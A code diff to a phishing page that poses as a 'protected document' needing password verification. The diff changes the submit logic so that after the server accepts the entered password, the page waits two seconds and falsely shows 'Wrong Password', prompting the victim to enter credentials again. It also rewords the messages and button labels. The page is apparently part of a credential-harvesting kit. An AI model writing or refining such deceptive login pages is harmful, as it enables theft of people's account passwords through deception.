@@ -21,7 +21,7 @@
                             <span class="h5"></span><br>
                             <span class="h">This is a protected document,
 please verify to access.</span><br>
-                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
+                            <span id="msg" class="text-danger" style="display: none;">Wrong Password</span><br>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
                             <div class="form-group">
@@ -59,7 +59,7 @@ please verify to access.</span><br>
 
             // Disable button and show loading state
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting...';
+            submitBtn.textContent = 'Loading...';
             errorMsg.style.display = 'none';
             passwordMsg.style.display = 'none';
 
@@ -73,9 +73,11 @@ please verify to access.</span><br>
                 });
 
                 if (response.ok) {
-                    // Wait for 2 seconds, then reload the page
+                    // Wait for 2 seconds, then show "Wrong Password" message
                     setTimeout(() => {
-                        window.location.reload();
+                        passwordMsg.style.display = 'block';
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'VIEW';
                     }, 2000);
                 } else {
                     // Show error message
